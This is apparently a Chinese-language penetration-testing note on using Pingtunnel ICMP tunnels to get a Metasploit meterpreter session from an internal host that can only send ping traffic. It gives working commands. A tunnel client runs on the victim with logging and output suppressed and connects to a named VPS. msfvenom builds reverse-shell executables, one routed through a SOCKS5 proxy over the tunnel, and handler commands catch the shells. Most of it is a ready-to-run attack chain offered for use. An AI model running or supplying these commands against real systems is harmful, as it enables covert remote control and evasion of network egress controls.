# 一、ICMP隧道作用
通过某种信道获取了内网主机的 shell，但是当前信道不适合做远控的通信信道， TCP和层协议不能出网，DNS、 HTTP等应用层协议也不能出网，只有 ICMP协议（如ping）可以出网。

![[Pasted image 20250313204207.png]]

目的：上线仅 ICMP协议出网的内网主机

# 二、Pingtunnel
通过伪造ping，把tcp/udp/sock5流量通过远程服务器转发到目的服务器上。用于突破某些运营商封锁TCP/UDP流量。

参数详情
```
./pingtunnel -h

Usage:

    // server
    pingtunnel -type server

    // client, Forward udp
    pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t SERVER_IP:4455

    // client, Forward tcp
    pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t SERVER_IP:4455 -tcp 1

    // client, Forward sock5, implicitly open tcp, so no target server is needed
    pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -sock5 1

    -type     服务器或者客户端

服务器参数server param:
    -key      设置的密码，默认0
    -nolog    不写日志文件，只打印标准输出，默认0
    -noprint  不打印屏幕输出，默认0
    -loglevel 日志文件等级，默认info
    -maxconn  最大连接数，默认0，不受限制
    -maxprt   server最大处理线程数，默认100
    -maxprb   server最大处理线程buffer数，默认1000
    -conntt   server发起连接到目标地址的超时时间，默认1000ms

客户端参数client param:
    -l        本地的地址，发到这个端口的流量将转发到服务器
    -s        服务器的地址，流量将通过隧道转发到这个服务器
    -t        远端服务器转发的目的地址，流量将转发到这个地址
    -timeout  本地记录连接超时的时间，单位是秒，默认60s
    -key      设置的密码，默认0
    -tcp      设置是否转发tcp，默认0
    -tcp_bs   tcp的发送接收缓冲区大小，默认1MB
    -tcp_mw   tcp的最大窗口，默认20000
    -tcp_rst  tcp的超时发送时间，默认400ms
    -tcp_gz   当数据包超过这个大小，tcp将压缩数据，0表示不压缩，默认0
    -tcp_stat 打印tcp的监控，默认0
    -nolog    不写日志文件，只打印标准输出，默认0
    -noprint  不打印屏幕输出，默认0
    -loglevel 日志文件等级，默认info
    -sock5    开启sock5转发，默认0
    -profile  在指定端口开启性能检测，默认0不开启
    -s5filter sock5模式设置转发过滤，默认全转发，设置CN代表CN地区的直连不转发
    -s5ftfile sock5模式转发过滤的数据文件，默认读取当前目录的GeoLite2-Country.mmdb
```

# 三、ICMP隧道转发TCP上线MSF
## 1.VPS启动ICMP隧道服务端
120.79.150.243，icmp服务端和msf服务都在此VPS上
```
./pingtunnel -type server
```
![[Pasted image 20250313212053.png]]

## 2.靶机启动ICMP隧道客户端
```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s 120.79.150.243 -t 120.79.150.243:7777 -tcp 1 -noprint 1 -nolog 1
```
ICMP 客户端监听 127.0.0.1:9999，通过连接到120.79.150.243的ICMP隧道，将127.0.0.1:9999收到的tcp数据包转发到120.79.150.243:7777
- -noprint：不打印数据
- -nolog：不生成日志


## 3.MSF生成反弹shell的payload上传到靶机
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=9999 -f exe > 9999.exe
```
![[Pasted image 20250313210915.png]]

## 4.开启监听
```
handler -p windows/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 7777
```

## 5.执行payload反弹shell到MSF




# 四、ICMP隧道转发Socks上线MSF
## 1.VPS启动ICMP隧道服务端
```
./pingtunnel -type server
```

## 2.靶机启动ICMP隧道客户端
```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s 120.79.150.243 -sock5 1 -noprint 1 -nolog 1
```
ICMP隧道客户端监听 127.0.0.1:9999启动socks5服务，通过连接到120.79.150.243的 ICMP隧道，由icmpserver转发socks5代理请求到目的地址120.79.150.243

## 3.MSF生成反弹Shell的payload
生成支持socks5代理的反向payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=120.79.150.243 lport=8899 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=9999 -f exe > 8899.exe
```

## 4.开启监听
```
handler -p windows/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 8899
```
![[Pasted image 20250313223801.png]]
## 5.执行payload反弹shell到MSF
![[Pasted image 20250313223828.png]]


